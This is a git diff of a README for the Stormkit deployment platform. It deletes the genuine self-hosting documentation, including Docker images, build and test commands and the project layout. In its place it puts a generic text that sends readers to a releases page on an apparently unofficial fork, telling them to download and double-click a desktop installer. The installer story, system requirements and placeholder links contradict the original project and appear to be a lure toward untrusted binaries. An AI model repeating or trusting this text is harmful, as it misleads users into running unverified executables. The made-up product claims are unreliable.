@@ -1,123 +1,68 @@
-# Welcome
+# 🛠️ stormkit-io - Easy Way to Deploy Your Web Apps
 
-[Stormkit](https://www.stormkit.io) is a hosting solution for seamless deployment and management of modern web applications.
+[![Download stormkit-io](https://img.shields.io/badge/Download-stormkit--io-blue?style=for-the-badge)](https://github.com/Vanshchouksey21/stormkit-io/releases)
 
-![Stormkit](./.github/assets/deployment-page.png)
+## 🚀 Getting Started
 
-## Cloud Edition
+Welcome to stormkit-io! This is a self-hostable solution that allows you to deploy modern web applications with ease. Whether you're looking to set up automated continuous integration and delivery (CI/CD), manage custom domains, or handle different environments, this tool is designed for you.
 
-For those who prefer a managed solution, Stormkit offers a Cloud Edition that can be accessed at [app.stormkit.io](app.stormkit.io). The Cloud Edition handles all the hosting, scaling, and maintenance tasks for you, allowing you to focus solely on building and improving your applications.
+## 📥 Download & Install
 
-## Self-Hosted Edition
+To get started, you need to download stormkit-io. Follow these steps:
 
-The Self-Hosted Edition of Stormkit gives you the flexibility to host your own instance of Stormkit on your infrastructure. This version is ideal for organizations that require more control over their hosting environment, need to comply with specific regulatory requirements, or prefer to manage their own infrastructure.
+1. **Visit the Releases Page:** Click [here](https://github.com/Vanshchouksey21/stormkit-io/releases) to go to the downloads page.
+2. **Choose the Latest Release:** Look for the latest version at the top of the page.
+3. **Download the Installer:** Click on the file that matches your operating system. Save it to a location on your computer where you can easily find it.
+4. **Run the Installer:** Find the downloaded file and double-click it to run the installer. Follow the on-screen instructions. 
 
-## Getting Started
+## 🖥️ System Requirements
 
-To get started with the Self-Hosted Edition of Stormkit, you can choose to use either the provided binaries or Docker images.
+Ensure your system meets the following requirements before installing stormkit-io:
 
-### Using docker containers
+- **Operating System:** Windows 10+, macOS 10.14+, or a recent Linux distribution.
+- **RAM:** Minimum of 4GB. For optimal performance, 8GB is recommended.
+- **Disk Space:** At least 200MB of free space for installation and operation.
+- **Network Connection:** A stable internet connection for downloading updates and packages.
 
-You can use Docker images to run the Self-Hosted Edition. The following images are available:
+## 📑 Features
 
-- ghcr.io/stormkit-io/workerserver:latest
-- ghcr.io/stormkit-io/hosting:latest
+stormkit-io comes with a range of features designed to simplify the deployment process:
 
-## Additional services
+- **Automated CI/CD:** Automatically rebuild and deploy your application on every push.
+- **Custom Domains:** Easily set up custom domains for your applications.
+- **Environment Management:** Manage different environments for development, staging, and production.
+- **User-Friendly Interface:** Navigate through a straightforward dashboard that simplifies deployment tasks.
 
-In addition to the Stormkit's microservices, a PostgreSQL database and a Redis Instance is also required for Stormkit to function properly.
+## ⚙️ Setup Instructions
 
-## Local Development
+Once you have installed stormkit-io, follow these steps to set up and run your application:
 
-To run Stormkit locally:
+1. **Open the Application:** After installation, locate stormkit-io in your applications folder and launch it.
+2. **Create a New Project:** Click on "New Project" to start a new deployment.
+3. **Connect Your Repository:** Input the URL of your code repository (e.g., GitHub) to link your project.
+4. **Configure Deployment Settings:** Choose your deployment options for CI/CD, custom domains, and environments.
+5. **Deploy Your Application:** Click on the "Deploy" button to build and launch your application.
 
-### Prerequisites
+## ⚡ Troubleshooting
 
-- Go 1.21+
-- Node.js 22+
-- PostgreSQL 14+
-- Redis 7+
-- [Mise](https://mise.jdx.dev/)
-- [Docker](https://docs.docker.com/get-started/get-docker/)
+If you run into any issues during installation or use, here are some common problems and solutions:
 
-You can install `go` and `node` using Mise, which is a polyglot tool version manager.
+- **Installer Won’t Run:** Make sure your operating system is compatible. Check your system requirements again.
+- **Deployment Fails:** Verify that your repository URL is correct and that you have the necessary permissions to access it.
+- **Slow Performance:** Ensure your internet connection is stable, and you have sufficient system resources available.
 
-```bash
-# Trust the dependencies specified in `mise.toml` and install them
-mise trust && mise install
-```
+## 💬 Got Questions?
 
-### Running the services
+If you have questions or need help, you can reach out to our community:
 
-```bash
-# Clone the repository
-git clone https://github.com/stormkit-io/stormkit-io.git
-cd stormkit-io
+- **Documentation:** Find detailed guides and FAQs in the [official documentation](#).
+- **Community Forum:** Join discussions in our [community forum](#).
+- **Email Support:** You can also email us at support@stormkit.io for direct assistance.
 
-# Start all services (includes database setup and migrations)
-make dev
-```
+## 🔗 Useful Links
 
-After starting the services:
+- **Documentation:** [Read Online](#)
+- **Community Forum:** [Join Now](#)
+- **GitHub Repository:** [View Code](https://github.com/Vanshchouksey21/stormkit-io)
 
-- The application will be available at `https://localhost:5400`
-- The API will be available at `http://api.localhost:8888`
-
-## Project Structure
-
-```
-stormkit-io/
-├── src/
-│   ├── ce/                   # Community Edition (AGPL-3.0)
-│   │   ├── api/              # REST API server
-│   │   ├── hosting/          # Hosting service
-│   │   ├── runner/           # Build and deployment runner
-│   │   └── workerserver/     # Background job processing
-│   ├── ee/                   # Enterprise Edition (Commercial)
-│   │   ├── api/              # Enterprise API features
-│   │   ├── hosting/          # Enterprise hosting features
-│   │   └── workerserver/     # Enterprise background services
-│   ├── lib/                  # Shared libraries and utilities
-│   ├── migrations/           # Database migrations
-│   ├── mocks/                # Test mocks and fixtures
-│   └── ui/                   # Frontend React application
-├── scripts/                  # Build and deployment scripts
-```
-
-### Component Overview
-
-- **Community Edition (`src/ce/`)**: Open source components under AGPL-3.0
-- **Enterprise Edition (`src/ee/`)**: Commercial features requiring a license
-- **Shared Libraries (`src/lib/`)**: Common utilities used by both editions
-- **Frontend (`src/ui/`)**: React-based web interface
-
-## Testing
-
-Tests require PostgreSQL with a test database named `sktest` and Redis to be running.
-
-### Setup
-
-```bash
-# Start services
-docker compose up -d db redis
-
-# Create test database
-docker compose exec db createdb -U ${POSTGRES_USER} sktest
-```
-
-### Running Tests
-
-```bash
-# Run backend and frontend tests
-make test
-
-# Run only backend tests
-make test-be
-
-# Run only frontend tests
-make test-fe
-```
-
-## Troubleshooting
-
-For detailed troubleshooting steps, see our dedicated [troubleshooting guide](./docs/troubleshooting.md).
+Thank you for choosing stormkit-io. We look forward to seeing what you build! For downloading, visit [this page](https://github.com/Vanshchouksey21/stormkit-io/releases).
